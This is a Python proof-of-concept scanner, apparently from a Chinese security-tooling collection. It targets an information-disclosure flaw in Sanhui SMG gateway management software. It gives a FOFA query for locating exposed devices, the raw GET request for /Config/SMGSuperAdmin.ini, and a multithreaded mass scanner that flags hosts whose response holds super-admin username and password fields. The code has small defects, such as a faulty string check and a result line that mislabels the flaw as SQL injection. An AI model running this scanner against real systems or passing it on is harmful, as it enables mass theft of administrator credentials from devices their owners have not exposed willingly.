# fofa：body="text ml10 mr20" && body="网关管理软件"
"""poc：GET /Config/SMGSuperAdmin.ini HTTP/1.1
        Host: 
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close"""

# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  ______   __       __   ______  
 /      \ /  \     /  | /      \ 
/$$$$$$  |$$  \   /$$ |/$$$$$$  |
$$ \__$$/ $$$  \ /$$$ |$$ | _$$/ 
$$      \ $$$$  /$$$$ |$$ |/    |
 $$$$$$  |$$ $$ $$/$$ |$$ |$$$$ |
/  \__$$ |$$ |$$$/ $$ |$$ \__$$ |
$$    $$/ $$ | $/  $$ |$$    $$/ 
 $$$$$$/  $$/      $$/  $$$$$$/  
                                 
                                 
                                 
"""
    print(test)


def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="三汇SMG 网关管理软件 smgsuperadmin 信息泄露")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input your file')

    # 实例化
    args = parse.parse_args()

    # 判断
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/Config/SMGSuperAdmin.ini'
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }


    try:
        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,timeout=5,verify=False)
            if "SuperUserName" and "SuperPwd" in res2.text:
                print(f"[+]该{target}存在信息泄露")
                with open('result.txt','a',encoding='utf-8')as f:    # 将结果保存到result.txt中
                    f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在信息泄露")
    except:
        print(f"该{target}存在问题，请手工进行测试")


if __name__ == "__main__":
    main()